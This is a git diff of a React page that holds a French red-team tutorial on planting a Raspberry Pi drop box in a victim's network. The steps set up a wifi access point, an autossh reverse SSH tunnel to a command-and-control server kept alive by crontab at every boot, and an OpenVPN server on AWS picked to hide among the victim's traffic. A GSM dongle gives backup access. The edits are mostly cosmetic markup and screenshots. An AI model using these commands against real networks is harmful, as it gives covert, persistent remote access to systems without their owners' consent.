@@ -4,8 +4,11 @@ import Hide from "../img/hide_raspberry.jpg"
 import Methodo from "../img/methodo.jpg"
 import KaliRaspberry from "../img/kali_raspberry.png"
 import Raspap from "../img/raspap_01.png"
-
-
+import InstanceVPS from "../img/instanceVPS.PNG"
+import FirewallRules from "../img/regles_firewall.PNG"
+import AutologinProfile from "../img/autologin_profil.png"
+import RedteamUser from "../img/user_redteam.PNG"
+import PublicIP from "../img/ip_publique.PNG"
 
 class Redteam extends React.Component {
     render() {
@@ -123,7 +126,7 @@ class Redteam extends React.Component {
 
         <p>On va utiliser l'outil <strong>raspAP</strong> pour mettre en place un point d'accès Wifi sur notre Raspberry :</p>
 
-        <div id="wifi">yes | curl -sL https://install.raspap.com | bash</div>
+        <div id="terminal">yes | curl -sL https://install.raspap.com | bash</div>
 
         <p>Après le reboot, raspAP a mis en place toute la configuration de l'Access Point (AP) !<br/><br/>
 
@@ -144,7 +147,7 @@ class Redteam extends React.Component {
         <img id="raspap" src={Raspap} alt="raspap_AP"/>
 
         {/* Installation manuelle (sans raspap)
-        <div id="wifi">apt-get install hostapd <br/>
+        <div id="terminal">apt-get install hostapd <br/>
         apt-get install pciutils<br/>
 
         nano /etc/network/interfaces<br/><br/>
@@ -251,49 +254,49 @@ class Redteam extends React.Component {
         </div> */}
 
         <h3>Configurer un reverse shell automatique</h3>
-        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C&C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   
+        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{"&"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   
 
-        <div id="wifi">
+        <div id="terminal">
         apt install autossh <br/>
         ssh-keygen (laisser les paramètres par défaut) 
         </div>
 
-        <div id="wifi">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>
+        <div id="terminal">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>
 
         <strong>[Sur le serveur]</strong><br/>
         Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>
 
-        <div id="wifi">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>
+        <div id="terminal">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>
 
         <p><strong>[Sur la Raspberry]</strong><br/>
         On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure de connexion)</p>
 
-        <div id="wifi">
+        <div id="terminal">
         vim /bin/autossh-connect.sh<br/>
 
         #!/bin/bash<br/>
-        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] &</div>
+        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] {"&"}</div>
 
         -N: n'exécute pas de cmd sur la machine intermédiaire<br/>
         -f: lancé en tache de fond<br/>
         <br/>
-        <div id="wifi">chmod u+rwx,g+xr,o+x autossh-connect.sh</div>
+        <div id="terminal">chmod u+rwx,g+xr,o+x autossh-connect.sh</div>
 
-        <div id="wifi">
+        <div id="terminal">
         crontab -e<br/>
         
         #Ajouter à la fin du fichier : <br/>
 
-        @reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1<br/>
-        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>
+        @reboot sleep 5 {"&&"} /bin/autossh-connect.sh > /dev/null 2>{"&"}1<br/>
+        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>{"&"}1<br/>
         </div>
         
         <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de commande et contrôle</p>
         <p>Exécutez la commande suivante sur le serveur pour obtenir le reverse shell :</p>
 
-        <div id="wifi">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      
+        <div id="terminal">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      
         
-        <h3>Configurer un client et un serveur OpenVPN</h3>
+        <h3>Configurer une connexion OpenVPN</h3>
         <p className="tabulation">Une garantie d'accès en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.
         </p>
 
@@ -309,26 +312,31 @@ class Redteam extends React.Component {
         <h3>Mise en place OpenVPN Access Server</h3>
         <p className="tabulation">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/>
 
-        <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. 
+        <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. Pour le POC je me suis crée un VPS perso sur Amazon.
         </p>
-
+      
         <ol>
           <li>Allez sur <a href="https://aws.amazon.com/lightsail/">Lien VPS amazon</a>, se connecter puis créer une nouvelle instance de VPS (OS Ubuntu)</li>
 
+          <img id="instance" src={InstanceVPS} alt="instance VPS"/>
+
           Une fois crée, Manage -> Networking, ajoutez 2 règles firewall sur les ports (443 et 943)
 
+          <img id="firewall" src={FirewallRules} alt="règle firewall"/>
+
           <li>Installez OpenVPN AS</li>
-          <p id="wifi" style={{'text-align':'left'}}># apt update && apt -y install ca-certificates wget net-tools <br/>
+          <p id="terminal" style={{'text-align':'left'}}>
+            # apt update {"&&"} apt -y install ca-certificates wget net-tools <br/>
             # wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>
-            # echo "deb http://as-repository.openvpn.net/as/debian bionic main">/etc/apt/sources.list.d/openvpn-as-repo.list <br/>
-            # apt update && apt -y install openvpn-as <br/>
+            # echo "deb http://as-repository.openvpn.net/as/debian bionic main" > /etc/apt/sources.list.d/openvpn-as-repo.list <br/>
+            # apt update {"&&"} apt -y install openvpn-as <br/>
           </p>
 
           <li>Supprimez le profil actuel et configurez OpenVPN:  <strong>/usr/local/openvpn_as/bin/ovpn-init</strong></li>
           <li>Tapez DELETE: (sensible à la casse)</li>
           <li>Finir l'installation comme suit :</li>
         </ol>
-        <p id="wifi">Accept EULA: yes <br/>
+        <p id="terminal">Accept EULA: yes <br/>
           Will this be the primary Access Server node: yes <br/>
           Please specify the network interface and IP address to be <br/>
           used by the Admin Web UI: <br/>
@@ -344,31 +352,36 @@ class Redteam extends React.Component {
           Should client DNS traffic be routed by default through the VPN? <br/>
           Réponse: YES <br/>
           Use local authentication via internal DB? <br/>
-          > Press ENTER for default [no]:  <br/>
-          Réponse: YES <br/>
-          Pour toute la suite sélectionnez les réponses par défaut (tapez juste 'Enter') <br/>
+          Pour la suite sélectionnez les réponses par défaut (tapez juste 'Enter') <br/>
           </p>
 
           <p>passwd openvpn <br/>
-          Changez le mot de passe pour l'utilisateur openvpn.<br/></p>
+          Changez le mot de passe pour l'utilisateur openvpn.</p>
     
+          <br/>
 
           <h3>Configuration de OpenVPN AS Server</h3>
           <ol>
             <li>Allez sur https://[IP_Serveur_VPS]:943/admin/</li>
             <li>Se connecter avec le compte <strong>openvpn</strong> et le mot de passe précédemment crée.</li>
-            <li>Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server</li>
-            <li>User Management -> User Permissions, créez un utilisateur <strong>redteam</strong> avec l'option <strong>Set AllowAuto-login</strong></li>
-            <li>-> More settings, activez les autorisations : <br/><strong>All server-side private subnets</strong><br/>
+            <li>Authentication -> General -> Set to Local (ON) -> Save Settings -> Update Server</li>
+            <li>User Management -> User Permissions, créez l'utilisateur <strong>redteam</strong> avec <strong>Set AllowAuto-login</strong></li>
+            <li>-> More settings, activez les autorisations : <br/>
+            <strong>All server-side private subnets</strong><br/>
             <strong>All other VPN clients</strong></li>
+            <li>-> Network settings, indiquer l'adresse publique du VPS</li>
           </ol>
 
-          <br/>
+          <img id="publique" src={PublicIP} alt="modification ip publique"/>
+
           <h3>Télécharger les profils OpenVPN</h3>
           <ol>
-            <li>Se connecter et télécharger les profils https://[Your VPS]:943/?src=connect</li>
-            <li>Pour chaque utilisateur se connecter et télécharger le profil</li>
-            <li>Sauvegarder redteam.ovpn</li>
+            <li>Se connecter sur https://[Your VPS]:943/?src=connect</li>
+            <li>Pour chaque utilisateur se connecter et télécharger le profil <strong>Yourself (autologin profile)</strong></li>
+
+            <img id="autologin" src={AutologinProfile} alt="autologin profile"/>
+
+            <li>Sauvegarder client.ovpn</li>
           </ol>
 
           <br/>
@@ -384,14 +397,15 @@ class Redteam extends React.Component {
           
           <br/>
 
-          <p className="tabulation">Dans le serveur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN. <br/><br/>
-          
-          Nous avons à présent la Raspberry configurée pour se reconnecter à notre serveur VPN dès qu'elle est connectée à un réseau.</p>
+          <p className="tabulation">Sur le serveur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN.</p>
 
-          <br/>
+          <img id="redteamuser" src={RedteamUser} alt="connexion utilisateur redteam"/>
+          
+          <p className="tabulation"> Nous avons à présent la Raspberry configurée pour se reconnecter à notre serveur VPS dès qu'elle est connectée à un réseau.</p>
+
+          <img src="https://media.giphy.com/media/x2z9nswqAfpp6/giphy.gif" alt="yatta"/>
 
           <h3>Configuration GSM pour la box</h3>
-
           <p>Lien pour dongle : <a href="http://shop.mchobby.be/product.php?id_product=677">dongle GSM (23,60€)</a>    (module 3G HSDPA, support SMS et connexion internet)</p>
 
 
@@ -417,10 +431,10 @@ class Redteam extends React.Component {
 
           Le fichier de configuration est un fichier texte comme celui-ci dessous :
 
-          <div id="wifi">
+          <div id="terminal">
           [Dialer Defaults]<br/>
           Init1 = ATZ<br/>
-          Init2 = ATQ0 V1 E1 S0=0 &C1 &D2<br/>
+          Init2 = ATQ0 V1 E1 S0=0 {"&"}C1 {"&"}D2<br/>
           Init3 = AT+CGDCONT=1,"IP","web.be"<br/>
           Stupid Mode = 1<br/>
           Modem Type = Analog Modem<br/>
